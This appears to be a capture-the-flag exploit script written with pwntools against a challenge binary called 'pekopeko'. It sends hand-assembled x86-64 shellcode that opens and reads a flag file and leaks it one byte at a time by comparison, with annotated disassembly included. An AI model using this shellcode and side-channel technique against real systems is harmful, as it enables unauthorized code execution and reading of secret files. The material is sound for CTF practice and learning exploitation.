from pwn import *
import struct
context.arch = "amd64"
# p = remote('140.115.59.7',10008)
p = process('pekopeko_distribute/share/pekopeko')


p.send(flat(b"yes"))
# input shell code
p.send(flat(b"\x48\x31\xD2\x80\xC1\x87\x48\x8D\xB5\x00\xFF\xFF\xFF\xB1\x87\xB1\x87\xB2\x90\xB8\x10\x11\x40\x00\xB1\x87\xB1\x87\x48\x31\xC9\xFF\xD0\x48\x83\xEC\x70\xB1\x87\x48\x83\xEC\x40\xFF\xD6\xB1\x87\x80\xC1\x87\xB1\x87\xB1\x87\x80\xC1\x87\xB1\x87\xB1\x87\x80\xC1\x87"))
# string input
inp=flat(
    # read flag X32
    b"\x59\xBF\x6C\x61\x67\x00\x57\x48\xBF\x6B\x6F\x70\x65\x6B\x6F\x2F\x66\x57\x48\xBF\x2F\x68\x6F\x6D\x65\x2F\x70\x65\x57\x48\x31\xF6\x48\x31\xD2\x48\x8D\x3C\x24\xB0\x02\x0F\x05\x48\x31\xFF\x66\xBF\x03\x00\x48\x31\xC0\x66\xBA\x40\x00\x50\x50\x50\x50\x48\x8D\x34\x24\x48\x31\xC0\x0F\x05\xB1\x87",
    #input compare string
    b"\x48\x31\xD2\xB2\x01\x48\x31\xFF\x57\x57\x57\x57\x57\x48\x8D\x34\x24\xB8\x10\x11\x40\x00\x48\x31\xC9\xFF\xD0",
    #compare string 
    b"\x0F\xB6\x54\x24\x31\x0F\xB6\x04\x24\x38\xC2",
    # ----------------     -----28(1)
    #jump
    b"\x48\x8D\x35\x13\x00\x00\x00\x48\x83\xC4\x28\x48\x8D\x9D\x46\xFF\xFF\xFF\x38\xC2\x48\x0F\x44\xDE\x53\xC3\xB0\xE7\x0F\x05",
    #others
    b"\xB1\x87\xB1\x87"
)
p.send(inp)

print("GUESS")
# a=b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"

# a1=b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
# a11=b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
# a111=b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
# a112=b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"

# a2=b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
# a21=b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55"
# a211=b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a"
# a2111=b"\x40\x41\x42\x43\x44\x45"
# a21111=b"\x40\x41\x42"

# a22=b"\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
# a221=b"\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e"

# a222=b"\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55"

# a2211=b"\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
# a2212=b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e"
# b=b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
p.send(b"a")
p.send(b"_")
p.interactive()


# input shell code
'''
0:  48                      dec    eax
1:  31 d2                   xor    edx,edx
3:  80 c1 87                add    cl,0x87
6:  48                      dec    eax
7:  8d b5 00 ff ff ff       lea    esi,[ebp-0x100]
d:  b1 87                   mov    cl,0x87
f:  b1 87                   mov    cl,0x87
11: b2 90                   mov    dl,0x90
13: b8 10 11 40 00          mov    eax,0x401110
18: b1 87                   mov    cl,0x87
1a: b1 87                   mov    cl,0x87
1c: 48                      dec    eax
1d: 31 c9                   xor    ecx,ecx
1f: ff d0                   call   eax
21: 48                      dec    eax
22: 83 ec 70                sub    esp,0x70
25: b1 87                   mov    cl,0x87
27: 48                      dec    eax
28: 83 ec 40                sub    esp,0x40
2b: ff d6                   call   esi
2d: b1 87                   mov    cl,0x87
2f: 80 c1 87                add    cl,0x87
32: b1 87                   mov    cl,0x87
34: b1 87                   mov    cl,0x87
36: 80 c1 87                add    cl,0x87
39: b1 87                   mov    cl,0x87
3b: b1 87                   mov    cl,0x87
3d: 80 c1 87                add    cl,0x87

'''

#read file
'''
0:  59                      pop    rcx
1:  bf 6c 61 67 00          mov    edi,0x67616c
6:  57                      push   rdi
7:  48 bf 6b 6f 70 65 6b    movabs rdi,0x662f6f6b65706f6b
e:  6f 2f 66
11: 57                      push   rdi
12: 48 bf 2f 68 6f 6d 65    movabs rdi,0x65702f656d6f682f
19: 2f 70 65
1c: 57                      push   rdi
1d: 48 31 f6                xor    rsi,rsi
20: 48 31 d2                xor    rdx,rdx
23: 48 8d 3c 24             lea    rdi,[rsp]
27: b0 02                   mov    al,0x2
29: 0f 05                   syscall
2b: 48 31 ff                xor    rdi,rdi
2e: 66 bf 03 00             mov    di,0x3
32: 48 31 c0                xor    rax,rax
35: 66 ba 40 00             mov    dx,0x40
39: 50                      push   rax
3a: 50                      push   rax
3b: 50                      push   rax
3c: 50                      push   rax
3d: 48 8d 34 24             lea    rsi,[rsp]
41: 48 31 c0                xor    rax,rax
44: 0f 05                   syscall
46: b1 87                   mov    cl,0x87
'''
#input compare string
'''
0:  48 31 d2                xor    rdx,rdx
3:  b2 01                   mov    dl,0x1
5:  48 31 ff                xor    rdi,rdi
8:  57                      push   rdi
9:  57                      push   rdi
a:  57                      push   rdi
b:  57                      push   rdi
c:  57                      push   rdi
d:  48 8d 34 24             lea    rsi,[rsp]
11: b8 10 11 40 00          mov    eax,0x401110
16: 48 31 c9                xor    rcx,rcx
19: ff d0                   call   rax
'''
#input compare string 
'''
0:  0f b6 54 24 31          movzx  edx,BYTE PTR [rsp+0x31]
5:  0f b6 04 24             movzx  eax,BYTE PTR [rsp]
'''
# jump
'''
0:  48 8d 35 13 00 00 00    lea    rsi,[rip+0x13]        # 0x1a
7:  48 83 c4 28             add    rsp,0x28
b:  48 8d 9d 46 ff ff ff    lea    rbx,[rbp-0xba]
12: 38 c2                   cmp    dl,al
        if:dl==al(rsi放入rbx) else:rbx不動
14: 48 0f 44 de             cmove  rbx,rsi
18: 53                      push   rbx
19: c3                      ret(pop rip)
1a: b0 e7                   mov    al,0xe7
1c: 0f 05                   syscall
'''